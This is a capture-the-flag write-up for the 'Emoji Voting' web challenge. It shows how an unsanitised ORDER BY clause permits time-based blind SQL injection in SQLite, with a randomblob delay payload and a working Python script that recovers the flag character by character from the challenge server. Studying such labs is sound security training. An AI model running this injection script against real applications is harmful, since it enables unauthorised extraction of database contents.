# Emoji Voting

Challenge text:
```
A place to vote your favourite and least favourite puny human emojis!
```
Along with the [source code](web_emoji_voting).

The website is quite simple, and allows you to vote on an emoji by clicking on it. Every 5 seconds it'll send a request to `/list` with the payload `{"order":"count DESC"}`, to update the votes for the emojis. As you may already be able to tell, this is very likely an SQL injection, as the client seems to be able to choose the order to sort the result by themself.

If we look at the source code we see that it, we see that the `/list` endpoints returns the result of this query: `SELECT * FROM emojis ORDER BY ${ order }`, where `order` should be `count DESC`, but can be chosen by the user. This allows us to perform blind SQL injection, and get the flag character by character.

As the server didn't give any response, I had to perform a sleep based injection, I wrote the payload `(SELECT name, CASE WHEN substr(flag, <position>, 1) == '<character>' THEN randomblob(2000000) ELSE 'Yes' END FROM sqlite_master) DESC;`. This will perform run `randomblob(2000000)` if the character in a specific position is equal to the one we sent in. Runing `randomblob()` with a high number will take a significant amount of time,so if the request takes longer than usual, we know that we have the correct character from the DB.

Similar to both [E.Tree](../etree) and [Wild Goose Hunt](../wild_goose_hunt), I wrote a Python script to perform the injection.
```py
import requests

final = ""

for x in range(len(final), 100):
    for y in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if y == 0x7f:
            print("done!")
            __import__("sys").exit()
        
        y = chr(y)

        # x is the position, and y is the character
        sqli = f"(SELECT CASE WHEN substr(flag, {x+1}, 1) == '{y}' THEN randomblob(2000000) ELSE 'Yes' END FROM flag_efaf0a5343) DESC;" # i got the table name by running the script earlier and reading name from sqlite_master
        res_time = requests.post("http://188.166.172.13:31026/api/list", json={"order": sqli}).elapsed.total_seconds()

        if res_time > 0.5: # if the request takes longer than 0.5 seconds, randomblob(2000000) was ran, which means we have the correct character
            final += y
            break
    print(final)
```
This will slowly give us the flag.